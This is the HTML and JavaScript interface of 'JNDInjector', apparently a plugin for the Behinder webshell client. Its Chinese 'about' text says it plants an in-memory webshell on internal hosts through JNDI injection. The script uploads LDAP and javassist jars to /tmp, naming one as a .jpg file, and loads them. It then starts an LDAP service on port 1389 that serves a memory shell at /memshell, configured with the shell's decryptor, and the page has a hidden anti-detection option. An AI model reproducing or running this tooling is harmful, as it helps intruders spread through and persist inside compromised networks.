<div class="container-fluid pl-5 pt-5">
  <div class="row-fluid">
    <h3>
      JNDInjector
    </h3>
  </div>
  <ul class="nav nav-tabs" id="myTab" role="tablist">
    <li class="nav-item" role="presentation">
      <a class="nav-link active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">首页</a>
    </li>
    <li class="nav-item" role="presentation">
      <a class="nav-link" id="profile-tab" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="false">关于</a>
    </li>
  </ul>
  <div class="row">


  </div>
  <div class="tab-content" id="myTabContent">
    <div class="tab-pane fade show ml-3 active" id="home" role="tabpanel" aria-labelledby="home-tab">
      <div class="row mt-3">
        <div class="col-12">
          <form>
            <div class="form-group row">
              <div class="row col-4">
                <label for="port" class="col-sm-5 col-form-label">端口</label>
                <div class="col-sm-6">
                  <input id="port" class="form-control w-80" placeholder="端口号" type="text" value="1389"/>
                </div>
              </div>
              <div class="row col-8 p-0">
                <label for="path" class="col-2 col-form-label">内存马路径</label>
                <div class="col-5">
                  <input id="path" class="form-control" placeholder="请输入内存马的访问路径" type="text" value="/memshell"/>
                </div>
                <div class="form-check-inline col-sm-2" style="display:none">
                  <label class="form-check-label">
                    <input type="checkbox" class="form-check-input" value="antiAgent" name="antiAgent">防检测
                  </label>

                </div>
                <div class="control-group">
                  <div class="controls text-left"><button id="start" class="btn btn-primary" type="button" value="start">开启服务</button>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>

      </div>
      <hr/>
      <div class="row-fluid">
        <div>
          <form class="form-horizontal">
            <fieldset>
              <legend><h6>请求日志</h6></legend>
              <div class="control-group">
                                            <textarea class="form-control" style="width: 80%" id="log"
                                                      rows="20" value="GET / HTTP/1.0"></textarea>

              </div>

            </fieldset>
          </form>
        </div>

    <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
      <div class="alert alert-success m-3" >
        该工具用于在目标内网中通过JNDI注入的方式来植入冰蝎内存马，内存马的传输协议默认与主Shell一致。
      </div></div>
    <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">cc</div>
  </div>

</body>
<script>
  var resultPuller;
  $(document).ready(function () {

    $('#start').click(function (event) {

		if ($('#start').attr('value')=='start')
		{
	        var checkClass=PluginTools.checkClassExist('com.unboundid.ldap.listener.InMemoryDirectoryServer');
	        if (!checkClass)
	        {
	          var uploadRes = PluginTools.uploadFile('/tmp/unboundid.jpg', 'unboundid-ldapsdk-6.0.3.jar');
	          alert(uploadRes)
	          if (JSON.parse(uploadRes).status != "success")
	          {
	            alert('upload jar failed');
	            return;
	          }
	          var loadJarRes = PluginTools.loadJar('/tmp/unboundid.jpg');
	          if (JSON.parse(loadJarRes).status != "success")
	          {
	            alert('load jar failed');
	            return;
	          }
	        }
	        checkClass=PluginTools.checkClassExist('javassist.ClassPool');
	        if (!checkClass)
	        {
	          var uploadRes = PluginTools.uploadFile('/tmp/javassist.tmp', 'javassist-3.27.0-GA.jar');
	          alert(uploadRes)
	          if (JSON.parse(uploadRes).status != "success")
	          {
	            alert('upload jar failed');
	            return;
	          }
	          var loadJarRes = PluginTools.loadJar('/tmp/javassist.tmp');
	          if (JSON.parse(loadJarRes).status != "success")
	          {
	            alert('load jar failed');
	            return;
	          }
	        }
	        var params=warpParams();
	        params["action"]="start";

	        try
	        {
	          PluginTools.sendTask(JSON.stringify(params));
	          resultPuller=setInterval(getResult, 3000 );
	        }
	        catch (error)
	        {
	          alert(error);
	        }
			$('#start').attr('value','stop');
			$('#start').text('停止服务');
		}
		else
		{
			var params={action:"stop"};
	        try
	        {
	          PluginTools.sendTask(JSON.stringify(params));
	          resultPuller=setInterval(getResult, 3000 );
	        }
	        catch (error)
	        {
	          alert(error);
	        }
			clearInterval(resultPuller);
			$('#start').text('开启服务');
		}


    });
  });
  function randomString(e) {
    e = e || 32;
    var t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678",
            a = t.length,
            n = "";
    for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
    return n
  }
  function onResult(msg)
  {
    $('#log').text(decodeURIComponent(atob(msg)));
  }
  function getResult()
  {
    try
    {
      var result=PluginTools.getTaskResultSync();
      var resultObj = JSON.parse(result);
      var running=resultObj["msg"]["running"]=="true";
      if (resultObj["status"]=="success")
      {

        running=running?"Running":"Stopped";
        var log="[Success]["+running+"]"+resultObj["msg"]["result"];
        $('#log').text(log);
      }
      else
      {
        var log="[Fail]"+resultObj["msg"];
        $('#log').text(log);
        clearInterval(resultPuller);
      }
      if (running==false)
      {
        clearInterval(resultPuller);
      }
    }
    catch (error)
    {
      clearInterval(resultPuller);
    }


  }

  function warpParams()
  {
    var path = $('#path').val();
    var port = $('#port').val();
    var antiAgent= $('input[type=checkbox][name=antiAgent]')[0].checked?"true":"false";
    var decryptor= PluginTools.getCurrentDecryptClsBytes();
    alert(decryptor);
    return  {
      path: path,
      port: port,
      decryptor: decryptor,
      antiAgent: antiAgent
    };
  }

</script>
